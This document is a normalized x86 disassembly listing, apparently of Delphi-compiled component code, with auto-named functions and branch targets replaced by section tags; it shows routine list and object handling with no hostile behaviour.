mov ecx [ ebx + 0x88 ]
mov edx esi
mov eax ebx
call sub_477edc
test eax eax
je r-xdata
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
call sub_403128
retn
inc ebx
xor esi esi
mov eax esi
call sub_4191a8
push eax
mov eax esi
call sub_47b09c
pop edx
call sub_419818
xor ecx ecx
mov edx edi
mov eax ebx
call sub_477e34
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_47b09c
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
call sub_44c070
mov eax esi
call sub_47b09c
mov eax [ eax + 0x20 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4185a4
mov eax [ ebx + 0x84 ]
call sub_419538
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418700
call sub_44c078
mov eax [ ebx + 0x84 ]
mov edx esi
call sub_47901c
cmp edi [ eax + 0xc ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418700
test eax eax
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x84 ]
mov edx esi
call sub_419818
jmp r-xdata
sub_47842c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47851d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_455880
xor eax eax
push ebp
push j_sub_403608#2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffff
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4087bc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b300
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4784d2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403608#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47852c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4784d9
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_4784d9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478524
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
retn
sub_4784e8
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov eax [ ebp - 0xc ]
call sub_4316a4
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478524
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
retn
sub_47852c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478592
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b1d8
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_41ae08
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478599
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_4785a0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov eax ebx
call sub_419538
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_419538
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_479270
mov edx edi
mov eax ebx
call sub_479030
push eax
mov edx edi
mov eax ebx
call sub_479030
mov eax [ eax + 0xc ]
pop edx
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov edx edi
mov eax ebx
call sub_479030
mov eax [ eax + 0xc ]
mov si 0xffcf
call sub_403324
mov edx edi
mov eax ebx
call sub_479030
mov eax [ eax + 0xc ]
mov si 0xffd0
call sub_403324
mov edx edi
mov eax ebx
call sub_479030
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_47863c
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
cmp edx [ edi + 0x38 ]
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x8
je r-xdata
mov eax edi
call sub_455688
test bl bl
je r-xdata
mov bl 0x1
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x6c ]
call sub_419538
dec eax
test eax eax
jl r-xdata
inc eax
mov [ esp ] eax
xor ebp ebp
inc ebp
dec [ esp ]
jne r-xdata
inc esi
xor ebx ebx
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47a300
call sub_479bf4
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47a300
call sub_479bf4
mov edx ebx
call sub_47a4d4
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ edi + 0x6c ]
mov edx ebp
call sub_47a300
call sub_479bf4
mov edx ebx
call sub_47a4d4
cmp [ eax + 0x40 ] 0x0
je r-xdata
sub_4786e0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478740
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_419e08
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
call sub_419e08
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f38
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478747
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
sub_478750
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4788af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407fa8
mov eax [ ebp - 0xc ]
call sub_404178
test eax eax
jne r-xdata
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax ebx
call sub_419e08
mov eax [ ebp - 0x18 ]
call sub_4081e4
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax ebx
call sub_419e08
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_419fe8
mov eax [ ebp - 0x1c ]
call sub_4081e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405c78
mov eax [ ebp - 0x14 ]
mov cx [ r-xdata ]
mov dl 0x3
call sub_4315ac
dec eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788b6
lea eax [ ebp - 0x28 ]
mov edx 0x8
call sub_403edc
retn
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x94 ]
lea ecx [ ebp - 0x28 ]
mov edx esi
mov eax ebx
call sub_419e08
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_419fe8
mov eax [ ebp - 0x24 ]
call sub_4081e4
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov edx sub_4786e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
sub_4788be
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_478977
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x44 ] 0xffffffff
je r-xdata
mov bl 0x1
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47897e
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax [ esi + 0x6c ]
mov eax [ eax + 0x28 ]
sub eax [ edi + 0x5c ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
test bl bl
jne r-xdata
mov eax [ esi + 0x94 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ esi + 0x94 ]
call sub_419e08
mov eax [ ebp - 0x8 ]
call sub_4081e4
cmp eax [ edi + 0x44 ]
jl r-xdata
mov edx ebx
mov eax [ esi + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax [ ebp - 0x4 ]
setg al
mov ebx eax
dec ebx
inc ebx
sub_478988
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4789d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x94 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407f38
test eax eax
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4789dd
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_4789e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov edi [ eax + 0xc ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
xor edx edx
call sub_479dfc
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_419540
push eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_419540
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov edx edi
call sub_479dfc
sub_478a48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419880
mov [ ebx + 0x84 ] eax
sub_478a84
push ebx
mov ebx eax
mov eax ebx
call sub_45574c
mov eax [ ebx + 0x6c ]
test eax eax
je r-xdata
pop ebx
retn
push 0x0
push 0x0
mov edx eax
call sub_4797c0
sub_478aa4
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xba ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_478ae0
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_478b1c
push ebx
push esi
mov ebx [ r-xdata ]
cmp [ eax + 0xaa ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0xac ]
call [ esi + 0xa8 ]
mov eax ebx
pop esi
pop ebx
retn
mov ebx [ r-xdata ]
sub_478b50
push ebx
push ecx
mov edx [ r-xdata ]
mov [ esp ] edx
cmp [ eax + 0xa2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax [ r-xdata ]
mov [ esp ] eax
sub_478b8c
push ebx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_478bc4
call sub_419538
test eax eax
jg r-xdata
mov al 0x1
pop ebx
retn
sub_478bc4
push ebx
mov ebx eax
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax [ ebx + 0x84 ]
pop ebx
retn
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419880
mov [ ebx + 0x84 ] eax
sub_478bf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478cc5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41dcdc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ccc
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
xor eax eax
push ebp
push j_sub_403608
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
call sub_480bb8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_478d80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_478c69
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_40391c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b734
jmp r-xdata
call sub_40275c
mov edx eax
mov ebx [ rw-data ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ccc
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_478cd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
push ebp
push sub_478d38
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ eax + 0xc8 ]
test edx edx
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_480bb8
mov ebx eax
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4209e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478d3f
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_478d44
push ebx
mov ebx eax
mov eax ebx
call sub_40337c
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
call sub_480bb8
mov [ ebx + 0xc8 ] eax
sub_478d80
push ebx
push esi
push edi
push ebp
mov ebx eax
cmp edx [ ebx + 0xc8 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xc8 ] edx
mov eax [ ebx + 0x6c ]
call sub_419538
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x144 ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
call sub_47ea90
mov ebp eax
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
cmp ebp [ eax + 0x274 ]
jne r-xdata
xor eax eax
call sub_477b70
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_47a300
mov eax [ eax + 0xc ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_478e50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478f09
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418d14
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f10
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_478eec
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_478f80
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_478f18
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add eax 0x10
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_478f18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403f0c
mov eax [ esi ]
call sub_404178
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_405c78
mov eax esi
mov edx [ edi + 0x8 ]
call sub_403f0c
jmp r-xdata
sub_478f58
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4191c0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_478f18
pop esi
pop ebx
retn
sub_478f80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479000
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_478f7c
call sub_479010
cmp esi eax
jne r-xdata
cmp esi [ ebx + 0xc ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479007
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov edi esi
mov [ ebx + 0xc ] edi
mov eax ebx
call sub_478f7c
call sub_479010
mov edx eax
mov eax edi
call sub_420e08
sub_47905c
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c4e0
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404418
sub_47908c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f50
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_479110
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_479232
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404178
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404178
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4043d8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479239
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404460
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404238
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404178
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4043d8
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404238
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_479270
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_47974e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479755
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403edc
lea eax [ ebp - 0x38 ]
mov edx 0x3
call sub_403edc
lea eax [ ebp - 0x18 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
test dl dl
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_419538
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f50
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4796bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
call sub_419538
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
lea eax [ ebp - 0x38 ]
mov edx [ ebp - 0x4 ]
call sub_403f50
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov eax [ eax + 0x2c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x3c ] eax
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov eax [ eax + 0x20 ]
mov edx r-xdata
call sub_4042c4
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov eax [ eax + 0x2c ]
mov dl 0x1
call sub_479270
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1d ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_47908c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
cmp [ eax + 0x20 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x24 ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc eax
mov [ ebp - 0x3c ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_47908c
pop ecx
mov eax [ ebp - 0x34 ]
call sub_404178
cmp ebx eax
jle r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
call sub_479030
mov eax [ eax + 0x20 ]
lea edx [ ebp - 0x40 ]
call sub_45e2e8
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x30 ]
call sub_407d58
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x20
mov edx [ ebp - 0x34 ]
call sub_403f0c
inc esi
dec [ ebp - 0x3c ]
jne r-xdata
